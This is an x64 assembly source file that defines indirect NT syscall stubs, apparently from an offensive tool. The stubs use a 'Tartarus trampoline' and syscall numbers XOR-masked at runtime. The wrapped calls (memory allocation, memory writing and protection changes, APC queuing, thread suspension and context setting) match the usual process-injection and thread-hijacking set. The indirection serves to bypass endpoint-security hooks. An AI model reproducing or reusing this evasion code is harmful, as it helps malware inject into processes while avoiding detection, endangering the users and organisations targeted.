; native_memory.asm — indirect NT syscall stubs (Tartarus trampoline, x64)
; Encoded syscall numbers are XOR'd with g_sys_xor_mask at runtime.

PUBLIC ds_NtAllocateVirtualMemory
PUBLIC ds_NtFreeVirtualMemory
PUBLIC ds_NtProtectVirtualMemory
PUBLIC ds_NtReadVirtualMemory
PUBLIC ds_NtWriteVirtualMemory
PUBLIC ds_NtOpenProcess
PUBLIC ds_NtOpenThread
PUBLIC ds_NtSuspendThread
PUBLIC ds_NtResumeThread
PUBLIC ds_NtQueueApcThread
PUBLIC ds_NtGetContextThread
PUBLIC ds_NtSetContextThread
PUBLIC ds_NtClose
PUBLIC ds_NtQueryInformationProcess
PUBLIC ds_NtQueryVirtualMemory
PUBLIC ds_NtFlushInstructionCache
PUBLIC ds_NtQuerySystemInformation

PUBLIC g_sys_xor_mask
PUBLIC g_sys_trampoline
PUBLIC g_sys_NtAllocateVirtualMemory
PUBLIC g_sys_NtFreeVirtualMemory
PUBLIC g_sys_NtProtectVirtualMemory
PUBLIC g_sys_NtReadVirtualMemory
PUBLIC g_sys_NtWriteVirtualMemory
PUBLIC g_sys_NtOpenProcess
PUBLIC g_sys_NtOpenThread
PUBLIC g_sys_NtSuspendThread
PUBLIC g_sys_NtResumeThread
PUBLIC g_sys_NtQueueApcThread
PUBLIC g_sys_NtGetContextThread
PUBLIC g_sys_NtSetContextThread
PUBLIC g_sys_NtClose
PUBLIC g_sys_NtQueryInformationProcess
PUBLIC g_sys_NtQueryVirtualMemory
PUBLIC g_sys_NtFlushInstructionCache
PUBLIC g_sys_NtQuerySystemInformation

.data
g_sys_xor_mask                  DWORD 0
g_sys_trampoline                QWORD 0
g_sys_NtAllocateVirtualMemory   DWORD 0
g_sys_NtFreeVirtualMemory       DWORD 0
g_sys_NtProtectVirtualMemory    DWORD 0
g_sys_NtReadVirtualMemory       DWORD 0
g_sys_NtWriteVirtualMemory      DWORD 0
g_sys_NtOpenProcess             DWORD 0
g_sys_NtOpenThread              DWORD 0
g_sys_NtSuspendThread           DWORD 0
g_sys_NtResumeThread            DWORD 0
g_sys_NtQueueApcThread          DWORD 0
g_sys_NtGetContextThread        DWORD 0
g_sys_NtSetContextThread        DWORD 0
g_sys_NtClose                   DWORD 0
g_sys_NtQueryInformationProcess DWORD 0
g_sys_NtQueryVirtualMemory      DWORD 0
g_sys_NtFlushInstructionCache   DWORD 0
g_sys_NtQuerySystemInformation  DWORD 0

.code

ds_NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, g_sys_NtAllocateVirtualMemory
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtAllocateVirtualMemory ENDP

ds_NtFreeVirtualMemory PROC
    mov r10, rcx
    mov eax, g_sys_NtFreeVirtualMemory
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtFreeVirtualMemory ENDP

ds_NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, g_sys_NtProtectVirtualMemory
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtProtectVirtualMemory ENDP

ds_NtReadVirtualMemory PROC
    mov r10, rcx
    mov eax, g_sys_NtReadVirtualMemory
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtReadVirtualMemory ENDP

ds_NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, g_sys_NtWriteVirtualMemory
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtWriteVirtualMemory ENDP

ds_NtOpenProcess PROC
    mov r10, rcx
    mov eax, g_sys_NtOpenProcess
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtOpenProcess ENDP

ds_NtOpenThread PROC
    mov r10, rcx
    mov eax, g_sys_NtOpenThread
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtOpenThread ENDP

ds_NtSuspendThread PROC
    mov r10, rcx
    mov eax, g_sys_NtSuspendThread
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtSuspendThread ENDP

ds_NtResumeThread PROC
    mov r10, rcx
    mov eax, g_sys_NtResumeThread
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtResumeThread ENDP

ds_NtQueueApcThread PROC
    mov r10, rcx
    mov eax, g_sys_NtQueueApcThread
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtQueueApcThread ENDP

ds_NtGetContextThread PROC
    mov r10, rcx
    mov eax, g_sys_NtGetContextThread
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtGetContextThread ENDP

ds_NtSetContextThread PROC
    mov r10, rcx
    mov eax, g_sys_NtSetContextThread
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtSetContextThread ENDP

ds_NtClose PROC
    mov r10, rcx
    mov eax, g_sys_NtClose
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtClose ENDP

ds_NtQueryInformationProcess PROC
    mov r10, rcx
    mov eax, g_sys_NtQueryInformationProcess
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtQueryInformationProcess ENDP

ds_NtQueryVirtualMemory PROC
    mov r10, rcx
    mov eax, g_sys_NtQueryVirtualMemory
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtQueryVirtualMemory ENDP

ds_NtFlushInstructionCache PROC
    mov r10, rcx
    mov eax, g_sys_NtFlushInstructionCache
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtFlushInstructionCache ENDP

ds_NtQuerySystemInformation PROC
    mov r10, rcx
    mov eax, g_sys_NtQuerySystemInformation
    xor eax, g_sys_xor_mask
    jmp QWORD PTR g_sys_trampoline
ds_NtQuerySystemInformation ENDP

END
